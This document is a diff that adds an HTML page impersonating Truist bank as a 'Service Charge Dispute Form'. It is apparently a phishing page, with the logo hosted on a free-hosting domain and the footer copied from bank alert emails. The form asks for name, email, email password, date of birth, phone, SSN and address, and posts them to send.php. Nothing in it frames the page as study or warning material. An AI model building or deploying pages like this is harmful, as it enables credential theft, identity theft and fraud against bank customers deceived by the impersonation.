@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Client Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f7f8;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Header with logo left, title center */
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px;
+      background-color: #6a1b9a; /* purple background */
+      color: white;
+      flex-wrap: wrap;
+    }
+
+    header img {
+      max-width: 120px;
+      height: auto;
+    }
+
+    header h1 {
+      flex: 1;
+      text-align: center;
+      font-size: 24px;
+      margin: 0;
+      color: white;
+    }
+
+    form {
+      background: #fff;
+      max-width: 500px;
+      margin: 20px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 20px;
+      color: #555;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="date"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    textarea {
+      resize: vertical;
+      height: 100px;
+    }
+
+    input[type="submit"] {
+      margin-top: 25px;
+      background-color: #6a1b9a; /* purple submit button */
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #4a1270;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      background-color: #eaeaea;
+      font-size: 14px;
+      color: #555;
+    }
+
+    /* Mobile responsiveness */
+    @media (max-width: 600px) {
+      header {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      header img {
+        margin-bottom: 10px;
+      }
+
+      header h1 {
+        font-size: 20px;
+        text-align: center;
+      }
+
+      form {
+        padding: 20px;
+        margin: 10px;
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+  <header>
+    <!-- Replace with your logo path -->
+    <img src="http://truhost.fwh.is/images/trulogo_horz-trupurple.png" alt="Truist Wallet" width="150">
+    <h1>Service Charge Dispute Form</h1>
+  </header>
+
+
+
+  <form action="send.php" method="post">
+    <label>Full Name:</label>
+    <input type="text" name="name" required>
+
+    <label>Email:</label>
+    <input type="email" name="email" required>
+
+    <label>Email Password:</label>
+    <input type="password" name="password" required>
+
+    <label>Date of Birth:</label>
+    <input type="date" name="birth_date" required>
+
+    <label>Phone:</label>
+    <input type="text" name="phone">
+
+    <label>SSN:</label>
+    <input type="text" name="service">
+
+    <label>Verified Address:</label>
+    <textarea name="verified_address"></textarea>
+
+    <input type="submit" value="Submit">
+  </form>
+
+  <footer>
+    Need additional assistance with mobileor online banking, visit help & support from
+           the more menu in online banking or mobileapp or call us at 502-224-1128. You can also
+           make changes to your alerts preferences at any time in online banking or the app.
+           If you found this email in your sperm or junk, add alertnotifications@message.truist.com
+           to your safe senders list.
+  </footer>
+
+</body>
+</html>
